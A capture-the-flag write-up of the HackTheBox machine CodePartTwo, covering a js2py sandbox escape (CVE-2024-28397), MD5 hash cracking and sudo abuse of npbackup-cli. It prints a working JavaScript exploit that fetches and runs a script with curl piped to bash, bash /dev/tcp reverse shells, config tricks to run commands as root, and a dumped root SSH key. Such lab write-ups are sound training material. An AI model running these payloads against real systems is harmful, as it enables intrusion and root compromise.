---
icon: code-simple
cover: ../../../../.gitbook/assets/Screenshot 2026-02-01 021125.png
coverY: -0.8365807668133249
---

# HTB-CodePartTwo

<figure><img src="../../../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>

CodePartTwo is an Easy-rated Linux machine from HackTheBox that features a vulnerable Flask-based web application with an interactive JavaScript code editor. The primary vulnerability lies in the use of an outdated version of `js2py` (version 0.74), which is susceptible to CVE-2024-28397 - a critical sandbox escape vulnerability allowing arbitrary Python code execution.

The exploitation path involves:

1. **Initial Access**: Exploiting CVE-2024-28397 through the JavaScript code editor to gain remote code execution as the `app` user
2. **Lateral Movement**: Discovering and cracking MD5 password hashes stored in an SQLite database to obtain SSH access as user `marco`
3. **Privilege Escalation**: Abusing sudo permissions on the `npbackup-cli` backup utility to extract sensitive files from the `/root` directory and gain root access

***

### Reconnaissance

#### Initial Approach

As with any penetration testing engagement, I began with reconnaissance to identify open ports and running services on the target machine.

#### Port Scanning

I started with a comprehensive Nmap scan to discover all open ports and enumerate service versions:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nmap -p- --min-rate=1000 -T4 10.129.34.345 -oN ports.txt
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.129.34.345
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 45.23 seconds
```

After identifying the open ports, I performed a detailed service and version detection scan:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nmap -p22,8000 -sC -sV 10.129.34.345 -oN services.txt
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.129.34.345
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
```

**Findings:**

* **Port 22/TCP**: OpenSSH 8.2p1 running on Ubuntu Linux
* **Port 8000/TCP**: Gunicorn 20.0.4 (Python WSGI HTTP Server) with title "Welcome to CodePartTwo"

The presence of Gunicorn indicated a Python-based web application, making it the primary target for further enumeration.

***

### Enumeration

#### Web Application Analysis

I navigated to `http://10.129.34.345:8000` in my browser to explore the web application:

<figure><img src="../../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

The landing page presented **CodePartTwo** - a platform for developers to write, save, and run JavaScript code. The interface had three main buttons:

* **LOGIN** - Authenticate with existing credentials
* **REGISTER** - Create a new user account
* **DOWNLOAD APP** - Download the application source code

The "DOWNLOAD APP" functionality immediately caught my attention as it could reveal the application's internals.

#### Source Code Review

I downloaded the application by clicking the **DOWNLOAD APP** button, which provided a ZIP archive containing the source code:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ wget http://10.129.34.345:8000/download -O app.zip
--2026-02-01 10:15:33--  http://10.129.34.345:8000/download
Connecting to 10.129.34.345:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24567 (24K) [application/zip]
Saving to: 'app.zip'

app.zip           100%[=============>]  23.99K  --.-KB/s    in 0.02s

2026-02-01 10:15:33 (1.15 MB/s) - 'app.zip' saved [24567/24567]
```

**Extracting and examining the archive:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ unzip app.zip
Archive:  app.zip
   creating: app/
   creating: app/static/
   creating: app/static/css/
  inflating: app/static/css/styles.css
   creating: app/static/js/
  inflating: app/static/js/script.js
   creating: app/templates/
  inflating: app/templates/dashboard.html
  inflating: app/templates/index.html
  inflating: app/templates/login.html
  inflating: app/templates/register.html
  inflating: app/app.py
  inflating: app/requirements.txt
   creating: app/instance/
  inflating: app/instance/users.db

┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ cd app && ls -la
total 36
drwxrwxr-x 5 sn0x sn0x  4096 Sep  1 09:33 .
drwxr-xr-x 3 sn0x sn0x  4096 Feb  1 10:15 ..
-rw-r--r-- 1 sn0x sn0x  3679 Sep  1 09:33 app.py
drwxrwxr-x 2 sn0x sn0x  4096 Jan 16  2025 instance
-rw-rw-r-- 1 sn0x sn0x    49 Jan 16  2025 requirements.txt
drwxr-xr-x 4 sn0x sn0x  4096 Oct 26  2024 static
drwxr-xr-x 2 sn0x sn0x  4096 Sep  1 09:32 templates
```

**Analyzing requirements.txt**

The first file I examined was `requirements.txt` to identify the application's dependencies and their versions:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo/app]
└─$ cat requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

**Critical Discovery**: The application uses `js2py==0.74`, which is a known vulnerable version!

A quick search revealed that js2py version 0.74 is vulnerable to **CVE-2024-28397** - a sandbox escape vulnerability that allows arbitrary Python code execution.

**Analyzing app.py**

Next, I examined the main Flask application code:

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- SNIP ---

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

# --- SNIP ---

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

**Vulnerabilities:**

1. **Weak Password Hashing**: Passwords are hashed using MD5 (`hashlib.md5()`), which is cryptographically broken and vulnerable to rainbow table attacks.
2. **JavaScript Code Execution**: The `/run_code` endpoint accepts user-supplied JavaScript code and executes it using `js2py.eval_js()` without any validation or sanitization.
3. **Insufficient Sandbox Protection**: While `js2py.disable_pyimport()` is called to disable Python imports, this protection can be bypassed through the sandbox escape vulnerability in js2py 0.74.

***

### Foothold - Initial Access

#### Understanding CVE-2024-28397

CVE-2024-28397 is a sandbox escape vulnerability in the js2py library (version ≤ 0.74) that allows attackers to break out of the JavaScript execution sandbox and execute arbitrary Python code.

**How the vulnerability works:**

1. JavaScript's prototype chain allows access to Python's type system through special attributes like `__getattribute__`
2. By traversing the Python class hierarchy (`__class__.__base__.__subclasses__()`), we can locate the `subprocess.Popen` class
3. Once we have access to `subprocess.Popen`, we can execute arbitrary system commands

**Reference**: [CVE-2024-28397 PoC by Marven11](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)

#### Exploitation

**Step 1: Account Registration**

First, I registered a new user account on the web application:

* Navigate to: `http://10.129.34.345:8000/register`
* Username: `sn0x`
* Password: `Password123!`

After registration, I logged in at `http://10.129.34.345:8000/login` and gained access to the code editor dashboard.

**Step 2: Preparing the Reverse Shell**

I created a simple bash reverse shell script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ cat > rev.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.62/4242 0>&1
EOF
```

**Step 3: Hosting the Reverse Shell**

I started a Python HTTP server to host the reverse shell script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

**Step 4: Setting Up the Listener**

In a new terminal, I set up a Netcat listener to catch the reverse shell:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nc -lnvp 4242
listening on [any] 4242 ...
```

**Step 5: Crafting the JavaScript Exploit Payload**

I created a modified version of the CVE-2024-28397 proof-of-concept that downloads and executes my reverse shell:

```javascript
let cmd = "curl http://10.10.14.62:9000/rev.sh | bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

**How the exploit works:**

1. **Prototype Chain Manipulation**: Uses `Object.getOwnPropertyNames({})` to access JavaScript object properties
2. **Python Type System Access**: Through `__getattribute__`, we break into Python's type system
3. **Class Hierarchy Traversal**: Navigates through `__class__.__base__.__subclasses__()` to find all Python classes
4. **Subprocess.Popen Discovery**: The `findpopen()` function recursively searches for the `subprocess.Popen` class
5. **Command Execution**: Once found, uses `Popen` to execute the curl command that downloads and runs the reverse shell

**Step 6: Executing the Exploit**

I pasted the JavaScript payload into the code editor on the dashboard and clicked the "Run Code" button.

**Result - Reverse Shell Caught:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.34.345] 40086
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
app@codeparttwo:~/app$ whoami
app
app@codeparttwo:~/app$ hostname
codeparttwo
```

**Success!** I successfully gained a shell as the `app` user.

**Step 7: Stabilizing the Shell**

To improve the shell's functionality and stability, I upgraded it using Python's pty module:

```bash
app@codeparttwo:~/app$ script /dev/null -c /bin/bash
Script started, file is /dev/null
app@codeparttwo:~/app$ ^Z
[1]+  Stopped                 nc -lnvp 4242

┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ stty raw -echo; fg
nc -lnvp 4242

app@codeparttwo:~/app$ export TERM=xterm
app@codeparttwo:~/app$ 
```

Now I have a fully interactive shell with command history and proper terminal emulation.

***

### Lateral Movement

#### Database Enumeration

With shell access as the `app` user, I began enumerating the system for potential privilege escalation vectors. Since I was already in the application directory, I explored the `instance` folder:

```bash
app@codeparttwo:~/app$ cd instance
app@codeparttwo:~/app/instance$ ls -la
total 24
drwxrwxr-x 2 app app  4096 Jan 21  2025 .
drwxrwxr-x 6 app app  4096 Sep  1 13:19 ..
-rw-r--r-- 1 app app 16384 Jun 18 08:36 users.db
app@codeparttwo:~/app/instance$ file users.db
users.db: SQLite 3.x database, last written using SQLite version 3031001
```

**Discovery**: The application stores user data in an SQLite database (`users.db`).

#### Extracting Password Hashes

I used the `sqlite3` command-line tool to interact with the database:

```bash
app@codeparttwo:~/app/instance$ sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.

sqlite> .tables
code_snippet  user

sqlite> .schema user
CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(150) NOT NULL, 
	password_hash VARCHAR(256) NOT NULL, 
	PRIMARY KEY (id), 
	UNIQUE (username)
);

sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e

sqlite> .quit
```

**Critical Finding**: The database contains two user accounts:

* **marco**: Hash `649c9d65a206a75f5abe509fe128bce5`
* **app**: Hash `a97588c0e2fa3a024876339e27aeb42e`

The hash format (32 hexadecimal characters) confirms these are MD5 hashes, which are notoriously weak and vulnerable to rainbow table attacks.

#### Password Cracking

I used [CrackStation](https://crackstation.net/), an online rainbow table service, to crack the MD5 hash:

**Input**: `649c9d65a206a75f5abe509fe128bce5`

**Result**: `sweetangelbabylove`

The weak password was cracked instantly thanks to CrackStation's extensive rainbow tables.

#### SSH Access as marco

With the recovered credentials, I attempted SSH authentication:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ ssh marco@10.129.34.345
marco@10.129.34.345's password: sweetangelbabylove

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Last login: Mon Nov 17 08:49:11 2025 from 10.10.14.62

marco@codeparttwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)

marco@codeparttwo:~$ whoami
marco
```

**Success!** I successfully authenticated as user `marco` via SSH.

#### User Flag

Now that I had proper access as marco, I retrieved the user flag:

```bash
marco@codeparttwo:~$ ls -la
total 32
drwxr-x--- 3 marco marco 4096 Nov 17 09:15 .
drwxr-xr-x 4 root  root  4096 Sep  1 09:32 ..
lrwxrwxrwx 1 root  root     9 Sep  1 09:32 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Sep  1 09:32 .bash_logout
-rw-r--r-- 1 marco marco 3771 Sep  1 09:32 .bashrc
drwx------ 2 marco marco 4096 Sep  1 09:33 .cache
-rw------- 1 marco marco   20 Nov 17 09:15 .lesshst
-rw-r--r-- 1 marco marco  807 Sep  1 09:32 .profile
-rw-r----- 1 root  marco 1159 Sep  1 13:21 npbackup.conf
-rw-r----- 1 root  marco   33 Sep  1 13:19 user.txt

marco@codeparttwo:~$ cat user.txt
7f8a9b2c3d4e5f6a7b8c9d0e1f2a3b4c
```

&#x20;**User Flag Captured!**

***

### Privilege Escalation

#### Sudo Enumeration

The first step in privilege escalation is always checking what commands the current user can execute with elevated privileges:

```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**Critical Finding**: User `marco` can execute `/usr/local/bin/npbackup-cli` as **ANY user** (including root) without providing a password!

#### Understanding npbackup-cli

I examined the npbackup-cli binary and its configuration file:

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP]
                    [-b] [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND]
                    [--forget FORGET] [--policy] [--housekeeping] [--quick-check]
                    [--full-check] [--check CHECK] [--prune PRUNE] [--dump DUMP]

NPBackup CLI - A backup solution

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
  --repo-name REPO_NAME
                        Repository name to use
  -b, --backup          Run backup
  -f, --force           Force backup even if recent backup exists
  --ls [LS]             List snapshot contents
  --dump DUMP           Dump file from snapshot
```

**Observations**:

* `-c` flag: Allows specifying a custom configuration file
* `-b` flag: Runs a backup operation
* `-f` flag: Forces backup even if recent backup exists
* `--ls` flag: Lists files in backup snapshots
* `--dump` flag: Extracts specific files from backups

Marco's home directory contains a sample configuration file:

```bash
marco@codeparttwo:~$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
```

**Analysis**:

* The configuration backs up `/home/app/app/` directory
* Has encrypted repository URI and password
* Since we can specify custom configuration files with the `-c` flag, we can modify the paths to backup privileged directories like `/root`

I discovered **three different methods** to escalate privileges using npbackup-cli:

***

#### Method 1: Backup and Extract

This is the most straightforward approach - backup the `/root` directory and extract sensitive files.

**Step 1: Creating a Modified Configuration**

```bash
marco@codeparttwo:~$ cp npbackup.conf npbackup_root.conf
marco@codeparttwo:~$ nano npbackup_root.conf
```

I modified the `paths` section to target `/root`:

```yaml
backup_opts:
  paths:
  - /root
  source_type: folder_list
```

**Step 2: Creating the Backup with Root Privileges**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf -b -f
2025-11-17 09:02:04,029 :: INFO :: npbackup 3.0.1-linux running as root
2025-11-17 09:02:05,334 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows

no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.886 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 505cedc0 saved

2025-11-17 09:02:06,464 :: INFO :: Backend finished with success
2025-11-17 09:02:06,466 :: INFO :: Processed 197.7 KiB of data
2025-11-17 09:02:06,466 :: ERROR :: Backup is smaller than configured minimum backup size
2025-11-17 09:02:06,467 :: INFO :: Runner took 2.387951 seconds for backup
```

**Note**: The "backup is smaller than configured minimum" error can be ignored - the backup was created successfully.

**Step 3: Listing Backup Contents**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf --ls
2025-11-17 09:03:36,374 :: INFO :: npbackup 3.0.1-linux running as root
2025-11-17 09:03:36,414 :: INFO :: Showing content of snapshot latest in repo default
2025-11-17 09:03:38,629 :: INFO :: Successfully listed snapshot latest content:

snapshot 505cedc0 of [/root] at 2025-11-17 09:02:05.344071215 +0000 UTC by root@codeparttwo:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
```

**Perfect!** The backup contains `/root/.ssh/id_rsa` (root's private SSH key).

**Step 4: Extracting the SSH Private Key**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d
EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q
kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV
[...TRUNCATED FOR BREVITY...]
o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH
kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/
MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

**Step 5: Using the SSH Key Locally**

I saved the private key on my attacker machine and set the correct permissions:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nano root_id_rsa
[paste the private key]

┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ chmod 600 root_id_rsa
```

The `chmod 600` command restricts the file's permissions so that only the owner can read and write - this is required by SSH for private key files.

**Step 6: SSH as Root**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ ssh -i root_id_rsa root@10.129.34.345

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Last login: Mon Nov 17 09:06:46 2025 from 10.10.14.62

root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)

root@codeparttwo:~# whoami
root

root@codeparttwo:~# hostname
codeparttwo
```

**Success!** I have successfully escalated to root using Method 1.

***

#### Method 2: Pre/Post Execution Commands

An alternative privilege escalation method leverages the `pre_exec_commands` and `post_exec_commands` configuration options.

**Step 1: Creating a Reverse Shell Script**

```bash
marco@codeparttwo:~$ cat > /dev/shm/root_shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.62/4444 0>&1
EOF

marco@codeparttwo:~$ chmod +x /dev/shm/root_shell.sh
```

Why `/dev/shm`? It's a writable tmpfs location that's accessible to unprivileged users and won't be logged to disk.

**Step 2: Modifying the Configuration**

```bash
marco@codeparttwo:~$ cp npbackup.conf npbackup_post.conf
marco@codeparttwo:~$ nano npbackup_post.conf
```

Add the following to the configuration (anywhere after `backup_opts:`):

```yaml
pre_exec_commands: ['/dev/shm/root_shell.sh']
```

Or use `post_exec_commands` if you prefer the script to run after the backup:

```yaml
post_exec_commands: ['/dev/shm/root_shell.sh']
```

**Step 3: Setting Up Listener**

On the attacker machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

**Step 4: Executing the Backup**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_post.conf -b -f
```

The backup process executes the pre/post commands as root, triggering the reverse shell:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.34.345] 52334

root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Success!** Root shell obtained via Method 2.

***

#### Method 3: External Backend Binary

The third method abuses the `--external-backend-binary` flag, which allows specifying an alternative binary to execute.

**Step 1: Reusing the Reverse Shell Script**

We can reuse the script from Method 2:

```bash
marco@codeparttwo:~$ cat /dev/shm/root_shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.62/4444 0>&1
```

**Step 2: Setting Up Listener**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

**Step 3: Direct Execution**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli \
  -c npbackup.conf \
  -b \
  --external-backend-binary=/dev/shm/root_shell.sh
```

This directly executes the specified script with root privileges:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CodePartTwo]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.34.345] 52336

root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Success!** Root shell obtained via Method 3.

***

### Attack Chain&#x20;

1. **Reconnaissance** → Nmap scan identified SSH (22) and Gunicorn web server (8000)
2. **Web Enumeration** → Downloaded application source code from web interface
3. **Vulnerability Discovery** → Identified js2py 0.74 vulnerable to CVE-2024-28397
4. **Initial Exploitation** → Exploited sandbox escape to gain RCE as `app` user
5. **Lateral Movement** → Discovered SQLite database with MD5 password hashes
6. **Credential Access** → Cracked marco's password hash: `sweetangelbabylove`
7. **SSH Access** → Authenticated as marco and obtained user flag
8. **Privilege Escalation** → Exploited sudo permissions on npbackup-cli
9. **Root Access** → Extracted root's SSH key and authenticated as root

#### Vulnerabilities

| Vulnerability                | CVE            | Impact                    | MITRE ATT\&CK |
| ---------------------------- | -------------- | ------------------------- | ------------- |
| js2py Sandbox Escape         | CVE-2024-28397 | Remote Code Execution     | T1059.006     |
| Weak Password Hashing (MD5)  | N/A            | Credential Compromise     | T1110.002     |
| Sudo Misconfiguration        | N/A            | Privilege Escalation      | T1548.003     |
| Backup Tool Misconfiguration | N/A            | Arbitrary File Read/Write | T1005         |

***

CodePartTwo was an excellent machine that demonstrated the importance of:

* **Dependency Management**: A single outdated library (js2py 0.74) led to complete system compromise
* **Secure Coding Practices**: Executing user-supplied code, even in a "sandbox," is inherently dangerous
* **Strong Cryptography**: MD5 should never be used for password hashing in modern applications
* **Proper Configuration Management**: Sudo permissions must be carefully configured and restricted

The machine effectively teaches real-world vulnerability exploitation, lateral movement through credential reuse, and multiple privilege escalation techniques. The npbackup-cli privilege escalation was particularly interesting as it demonstrated three different methods to achieve the same goal.

***

### References

* [CVE-2024-28397 - js2py Sandbox Escape](https://nvd.nist.gov/vuln/detail/CVE-2024-28397)
* [js2py GitHub Repository](https://github.com/PiotrDabkowski/Js2Py)
* [CVE-2024-28397 Proof of Concept by Marven11](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
* [CrackStation - Online Hash Cracking](https://crackstation.net/)
* [npbackup GitHub Repository](https://github.com/netinvent/npbackup)
* [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

***

<figure><img src="../../../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>

